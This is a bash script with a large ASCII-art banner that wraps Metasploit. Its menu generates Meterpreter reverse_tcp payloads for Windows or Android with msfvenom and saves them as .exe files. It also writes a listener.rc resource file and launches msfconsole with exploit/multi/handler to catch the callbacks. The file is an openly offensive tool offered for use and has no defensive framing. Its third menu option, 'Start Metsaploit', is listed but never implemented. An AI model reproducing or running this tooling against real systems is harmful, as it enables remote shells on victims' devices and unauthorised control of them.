#!/bin/bash

lgreen="\e[92m"
lred="\e[91m"
nc="\e[39m"

clear

while :
do

echo -e $lred""
cat << "EOF"

                    .MMh:                                                    `/dN.                  
                     oMMMNs-                                              `/yMMM/                   
                     `mMMMMMd+.                                        `:yNMMMMh                    
                      :MMMMMMMNy/`                                   :sNMMMMMMN.                    
                       yMMMMMMMMMms-                              -omMMMMMMMMM/                     
                       .NMMMMMMMMMMMd+.       ``.....`         .+dMMMMMMMMMMMy                      
                        +MMMMMsyNMMMMds::+shdNNNNNNNNNNmdy+`.+hNMMMMMMhNMMMMm`                      
                        `dMMMMd`.+yooymNMMMMMMMMMMMMMMMMdoohNMMMMMMd+.+MMMMM/                       
                         -MMMMM+`+dNMMMMMMMMmdhhyyyyyhsoyNMMMMMMdso/`.NMMMMs                        
                          sMMMMN-mMMMMMmyssoyhdh/` `:smMMMMMMmsoymMMmo+dMMm`                        
                          `mMMMMy/MMdo.``/hMMMMMMms/sNMMMMmy:`-sNMMMMMmo+m:                         
                          ./MMMMM/o-`     `-smMMMMMNdoohy/`     .+dMMMMMm/                          
                         :m:hMMMMm`        .+sohNMMMMMNh/`        .+dMMMMNs`                        
                        +NMm-NMMMMo     `/yNMMNhosdMMMMMMmo-`     omosMMMMMh.                       
                       /MMMMooMMMMN- `:ymMMMMMMdo``:smMMMMMNd+.  -NMMy+NMMMMh`                      
                      -NMMMMs`mMMmy/smMMMMMMms:`     ./hNMMMMMNy`dMMMMs:NMMMMy                      
                     `dMMMMd` :yosdNMMMMMmy:.          `.odMMMMooMMMMN- /MMMMM:                     
                     :MMMMM: .+dNMMMMMNy/.`               `:smd:NMMMMo. `hMMMMd                     
                     yMMMMd-hNMMMMMNho.`                     .-dMMMMd:my:/mMMMM.                    
                     mMMMMsoMMMMNdsohm:                       sMMMMN:mMMMdsoyNM/                    
                     NMMMM+yMMdo-omMMMd`                     :MMMMMo:mMMMMMNhss:                    
                 `:s.mMMMMo+s:`  -MMMMM+                    `mMMMMd` ./hNMMMMMmy:`                  
              `-odNM/hMMMMh`      sMMMMN.                   sMMMMN-    `-odMMMMMMdo-`               
           `-+hNMMMMy/MMMMM-      `mMMMMy                  :MMMMM+       ssoymMMMMMNh/.             
         ./hNMMMMMNh/`mMMMMh`      /MMMMM:                `mMMMMh`      :MMNds/hNMMMMMmy:`          
      ./ymMMMMMMMh+:--+sssss:------.hMMMMm`.............../hhhhh-````` -NMMMMh``-smMMMMMMdo-`       
   `:ymMMMMMMMMMMMMMMMMMMMNNNNNNNNNd-NMMMMo+Nmmmmmmmmmmmmmmmddmddddddo-mMMMMm:hhhhdMMMMMMMMNh/.     
`-sdMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMooMMMMN-mMMMMMMMMMMMMMMMMMMMMMMNooNMMMMd:mMMMMMMMMMMMMMMMMmy:`  
.////+/++++++++oooooooosossyyyyhyyyys`mMMMMh:hhhhhhhhhhdddddmdddddy+hMMMMMy:hmmmmmmmmmmmmmmmNNNNmh+`
                          `smmmmmdo.` :MMMMM/          /hhhhh.  `:hNMMMMN+```````.``............-...
                           `/dMMMMMNy/.ymNMMm`        .NMMMMy.-odMMMMMNy.                           
                             `/dNMMMMMNhysoyh+        hMMMMm-dMMMMMMms-                             
                               `-smNMMMMMMMmdhysoooo-+MMMMM/hMMMMNh+.                               
                                  `:ohNNMMMMMMMMMMMm-NMMMMy+MNmy/.                                  
                                      .-/shmmNNNNNN:hMMMMm`//-                                      
                                          /hyyss/:-+MMMMM:                                          
                                          `mMMMMy`.NMMMMs                                           
                                           /MMMMM:dMMMMm`                                           
                                            hMMMMNMMMMM:                                            
                                            .NMMMMMMMMs                                             
                                             oMMMMMMMd`                                             
                                             `mMMMMMM-                                              
                                              :MMMMMo                                               
                                               yMMMd`                                               
                                               .NMM-                                                
                                                +M+                                                 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
....................................................................................................
EOF

echo -e $lgreen""
echo "1) Make a Payload"
echo ""
echo "2) Start a Listener"
echo ""
echo "3) Start Metsaploit"
echo ""
echo "E) Exit"
read -p "-->> " player1
##################################################################################################################################
if [[ $player1 == "1" ]]; then
echo "starting..."
rm -r listener.rc
> listener.rc
sleep 3

clear
echo "Make a Payload:"
echo "More coming soon..."
echo "Meterpreter / reverse_tcp"
echo ""
echo ""
echo "What type of payload do you want"
echo ""
echo "windows) Windows"
echo ""
echo "android) Android"
echo ""
read -p "-->> " payloadtype
echo "use exploit/multi/handler" >> listener.rc
echo "set PAYLOAD $payloadtype/meterpreter/reverse_tcp" >> listener.rc
echo ""
read -p "LHOST -->>" LHOST
echo "set LHOST $LHOST" >> listener.rc
echo ""
read -p "LPORT -->>" LPORT
echo "set LPORT $LPORT" >> listener.rc
echo ""
read -p "Payload Name -->>" PNAME
EXE=.exe
PNAMEEXE="$PNAME$EXE"
echo ""
echo "creating now.."
echo "exploit" >> listener.rc
msfvenom -p $payloadtype/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o /root/$PNAMEEXE
echo "saved to /root/$PNAMEEXE"

echo "Do you want to start a listener?"
echo "y / n"
read -p "-->>" listeneryesno
  if [[ $listeneryesno == "y" ]]; then
    msfconsole -r listener.rc
  fi
  if [[ $listeneryesno == "n" ]]; then
    echo "ok"
    rm -r listener.rc
    >  listener.rc
  fi
sleep 5

fi
##################################################################################################################################
if [[ $player1 == "2" ]]; then
echo "starting..."
rm -r listener.rc
> listener.rc
sleep 3

clear
echo "meterpreter/reverse_tcp only"
read -p "Press enter to continue"

echo "use exploit/multi/handler" >> listener.rc

echo "What payload type"
read -p "-->>" payloadtype
echo "set PAYLOAD $payloadtype/meterpreter/reverse_tcp" >> listener.rc

echo "What is your LHOST"
read -p "-->>" LHOST
echo "set LHOST $LHOST" >> listener.rc

echo "What is your LPORT"
read -p "-->>" LPORT
echo "set LPORT $LPORT" >> listener.rc
echo "exploit" >> listener.rc

read -p "Press enter to start"
msfconsole -r listener.rc

fi
if [[ $player1 == "e" ]]; then
cd ..
exit 0
fi

done